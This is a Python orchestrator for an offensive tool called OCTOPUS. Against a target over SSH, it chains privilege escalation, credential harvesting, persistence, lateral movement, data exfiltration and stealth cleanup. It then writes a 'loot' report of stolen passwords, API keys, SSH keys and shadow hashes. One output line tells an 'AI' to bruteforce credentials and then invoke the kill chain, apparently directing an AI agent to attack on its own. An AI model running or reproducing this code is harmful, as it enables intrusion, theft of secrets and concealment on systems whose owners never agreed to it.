#!/usr/bin/env python3
"""
Kill chain orchestrator: runs all stages.
"""

import os
import logging
import re
import time
import socket
import shutil
import subprocess
import concurrent.futures

try:
    import paramiko
except ImportError:
    paramiko = None

try:
    from config import CFG, find_wordlist, find_all_wordlists
except ImportError:
    CFG = {}
    def find_wordlist(cat): return ""
    def find_all_wordlists(cat): return []

from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec
from core.killchain.privesc import run_privesc, _harvest_credentials
from core.killchain.persistence import plant_persistence
from core.killchain.lateral import lateral_move
from core.killchain.exfil import data_exfil
from core.killchain.cleanup import stealth_cleanup
from core.killchain.vuln_assess import vuln_assess
from core.killchain.exploitation import auto_exploit

# ANSI Colors
C_GREEN  = "\033[92m"
C_YELLOW = "\033[93m"
C_RED    = "\033[91m"
C_CYAN   = "\033[96m"
C_GREY   = "\033[90m"
C_BLUE   = "\033[94m"
C_MAGENTA = "\033[95m"
C_RESET  = "\033[0m"


# ═══════════════════════════════════════════════
# PARAMIKO SSH HELPERS (shared across stages)
# ═══════════════════════════════════════════════


def run_full_killchain(target: str, user: str = None, password: str = None,
                       recon_data: str = "", port: int = 22) -> str:
    """
    Run the complete kill chain in sequence.
    v8.1: Correct order with re-authentication after privesc.
    Order: Privesc → Harvest → Persist → Lateral → Exfil → Cleanup (LAST!)
    """
    print(f"\n  {C_RED}{'=' * 60}{C_RESET}")
    print(f"  {C_RED}  OCTOPUS FULL KILL CHAIN v8.1 -- {target}{C_RESET}")
    print(f"  {C_RED}{'=' * 60}{C_RESET}")

    full_output = ""

    # Stages 3-9 require SSH credentials
    if user and password:
        full_output += (
            f"[*] Credentials available ({user}@{target}) -- skipping external vuln/exploit stages.\n"
            f"[*] Proceeding directly to post-exploitation stages 3-9.\n\n"
        )
        print(f"  {C_GREEN}[+] Credentials available -- skipping stages 1-2, going to post-exploit{C_RESET}")

        # Stage 3: Privilege Escalation
        privesc_output = run_privesc(target, user, password, port)
        full_output += privesc_output

        # v8.1: RE-AUTHENTICATE as root after privesc
        eff_user = user
        eff_pass = password
        if "ROOT ACCESS CONFIRMED" in privesc_output or "uid=0(root)" in privesc_output:
            re_authed = False

            # Method 1: Try root with known credentials from credential store
            try:
                from tools import get_best_creds_for_target
                root_creds = get_best_creds_for_target(target, "ssh")
                root_pass = root_creds.get("password", password) if root_creds else password
                test_client, test_err = _ssh_connect(target, "root", root_pass, port)
                if test_client:
                    test_client.close()
                    eff_user = "root"
                    eff_pass = root_pass
                    re_authed = True
                    print(f"  {C_GREEN}[+] RE-AUTHENTICATED as root (credential store){C_RESET}")
                    full_output += f"\n[+] Re-authenticated as root for stages 4-9\n"
            except Exception as e:
                logger.debug(f"Root re-auth via credential store failed: {e}")

            # Method 2: Try SSH key auth as root
            if not re_authed:
                try:
                    test_client, test_err = _ssh_connect(target, "root", "__KEY_AUTH__", port)
                    if test_client:
                        test_client.close()
                        eff_user = "root"
                        eff_pass = "__KEY_AUTH__"
                        re_authed = True
                        print(f"  {C_GREEN}[+] RE-AUTHENTICATED as root via SSH key{C_RESET}")
                        full_output += f"\n[+] Re-authenticated as root via SSH key for stages 4-9\n"
                except Exception as _exc:
                    logging.debug(f"Suppressed in orchestrator.py: {_exc}")

            if not re_authed:
                print(f"  {C_YELLOW}[!] Root re-auth failed — continuing as {user} (rootbash may be available){C_RESET}")
                full_output += f"\n[!] Root re-auth failed. Continuing as {user}.\n"
                full_output += "[!] Note: /tmp/.mtr/rootbash may be available for local root commands.\n"

        # Stage 4: Credential Harvesting (from root = gets shadow, keys, etc.)
        try:
            harvest_client, harvest_err = _ssh_connect(target, eff_user, eff_pass, port)
            if harvest_client:
                full_output += "\n" + _harvest_credentials(harvest_client, target)
                harvest_client.close()
            else:
                full_output += f"\n[-] Credential harvest SSH failed: {harvest_err}\n"
        except Exception as e:
            full_output += f"\n[-] Credential harvest error: {e}\n"

        # Stage 5: Persistence (from root = SSH keys, SUID, crontab)
        full_output += "\n" + plant_persistence(target, eff_user, eff_pass, port)

        # Stage 6: Lateral Movement
        full_output += "\n" + lateral_move(target, eff_user, eff_pass, port)

        # Stage 7: Data Exfiltration (from root = full access)
        full_output += "\n" + data_exfil(target, eff_user, eff_pass, port)

        # Stage 9: Stealth Cleanup (v7.0) — ALWAYS LAST!
        full_output += "\n" + stealth_cleanup(target, eff_user, eff_pass, port)
    else:
        # No creds — run full discovery pipeline
        # Stage 1: Vulnerability Assessment (always runs)
        full_output += vuln_assess(target, recon_data)

        # Stage 2: Automated Exploitation (always runs)
        full_output += "\n" + auto_exploit(target, recon_data)

        full_output += "\n[!] No SSH credentials available -- stages 3-9 skipped.\n"
        full_output += "AI: Find credentials first via bruteforce, then run [TOOL: killchain_full TARGET USER PASSWORD]\n"

    # Generate final report after all stages complete
    if user and password:
        loot_base = os.path.expanduser("~/OCTOPUS/loot")
        loot_dir = os.path.join(loot_base, target.replace('.', '_'))
        os.makedirs(loot_dir, exist_ok=True)
        _generate_target_report(target, eff_user, loot_dir, [], full_output)

    return full_output


# ═══════════════════════════════════════════════
# STAGE 9: STEALTH CLEANUP (v7.0)
# ═══════════════════════════════════════════════


def _generate_target_report(host: str, user: str, loot_dir: str,
                            exfil_files: list, full_output: str):
    """Generate a comprehensive target intelligence report.
    Saves to loot_dir/<IP>_report.txt with all discovered credentials,
    keys, tokens, services, and kill chain results."""
    import re as _re
    from datetime import datetime as _dt

    report_path = os.path.join(loot_dir, f"{host.replace('.', '_')}_report.txt")
    print(f"    {C_GREEN}[*] Generating target report: {report_path}{C_RESET}")

    lines = []
    lines.append(f"{'═' * 70}")
    lines.append(f"  OCTOPUS TARGET INTELLIGENCE REPORT")
    lines.append(f"  Target: {host}")
    lines.append(f"  Generated: {_dt.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"  Initial Access: {user}@{host}")
    lines.append(f"{'═' * 70}")
    lines.append("")

    # ── CREDENTIALS SECTION ────────────────────────────────────
    lines.append("[CREDENTIALS DISCOVERED]")
    lines.append("-" * 40)
    # From credential cache
    try:
        from tools import get_all_known_creds_for_target
        all_creds = get_all_known_creds_for_target(host)
        for svc, cred_list in all_creds.items():
            for u, p in cred_list:
                lines.append(f"  [{svc}] {u}:{p}")
    except ImportError:
        pass

    # From output text
    for m in _re.finditer(r'(?:DB_PASSWORD|DB_PASS|MYSQL_PASSWORD)\s*[=:]\s*[\'"]?([^\s\'"#;]{3,80})', full_output, _re.IGNORECASE):
        lines.append(f"  [database] password: {m.group(1)}")
    for m in _re.finditer(r'(?:API_KEY|SECRET_KEY|APP_SECRET|JWT_SECRET)\s*[=:]\s*[\'"]?([^\s\'"#;]{8,120})', full_output, _re.IGNORECASE):
        lines.append(f"  [api_key] {m.group(1)[:60]}")
    lines.append("")

    # ── PRIVATE KEYS SECTION ──────────────────────────────────
    if "PRIVATE KEY" in full_output:
        lines.append("[SSH PRIVATE KEYS FOUND]")
        lines.append("-" * 40)
        for m in _re.finditer(r'SSH PRIVATE KEY found: (\S+)', full_output):
            lines.append(f"  Key: {m.group(1)}")
        lines.append("")

    # ── SHADOW HASHES ─────────────────────────────────────────
    if "shadow" in full_output.lower() and "$" in full_output:
        lines.append("[SHADOW HASHES]")
        lines.append("-" * 40)
        for m in _re.finditer(r'(\w+):\s*(\$[\dy]+\$[^\s:]+)', full_output):
            lines.append(f"  {m.group(1)}: {m.group(2)[:50]}...")
        lines.append("")

    # ── EXFILTRATED FILES ─────────────────────────────────────
    if exfil_files:
        lines.append("[EXFILTRATED FILES]")
        lines.append("-" * 40)
        for ef in exfil_files:
            lines.append(f"  {ef['remote']} → {ef['local']} ({ef['size']} bytes)")
        lines.append("")

    # ── NETWORK INFO ──────────────────────────────────────────
    lines.append("[NETWORK INFORMATION]")
    lines.append("-" * 40)
    for m in _re.finditer(r'Internal subnet: (\S+)', full_output):
        lines.append(f"  Subnet: {m.group(1)}")
    for m in _re.finditer(r'DISCOVERED INTERNAL HOSTS: (\d+)', full_output):
        lines.append(f"  Internal hosts found: {m.group(1)}")
    for m in _re.finditer(r'→ (\d+\.\d+\.\d+\.\d+)', full_output):
        lines.append(f"  Internal host: {m.group(1)}")
    lines.append("")

    # ── KILL CHAIN RESULTS ────────────────────────────────────
    lines.append("[KILL CHAIN RESULTS]")
    lines.append("-" * 40)
    stages = [
        ("Privilege Escalation", "PRIVILEGE ESCALATION"),
        ("Persistence", "Persistence methods planted"),
        ("Lateral Movement", "Hosts compromised"),
        ("Data Exfiltration", "Files exfiltrated"),
    ]
    for stage_name, marker in stages:
        if marker in full_output:
            m = _re.search(r'{}'.format(_re.escape(marker)) + r'[:\s]*(\d+)', full_output)
            count = m.group(1) if m else "?"
            lines.append(f"  {stage_name}: {count}")
    lines.append("")
    lines.append(f"{'═' * 70}")
    lines.append(f"Report saved to: {report_path}")
    lines.append(f"Loot directory: {loot_dir}")

    # Write report
    try:
        with open(report_path, "w") as f:
            f.write("\n".join(lines))
        print(f"    {C_GREEN}[+] Target report saved: {report_path}{C_RESET}")
    except Exception as e:
        print(f"    {C_RED}[!] Failed to save report: {e}{C_RESET}")


# ═══════════════════════════════════════════════
# QUICK TEST
# ═══════════════════════════════════════════════

if __name__ == "__main__":
    target = input("Target IP: ").strip()
    user = input("SSH User (or Enter to skip): ").strip()
    pwd = input("SSH Password (or Enter to skip): ").strip()

    if user and pwd:
        print(run_full_killchain(target, user, pwd))
    else:
        print(vuln_assess(target))
        print(auto_exploit(target))

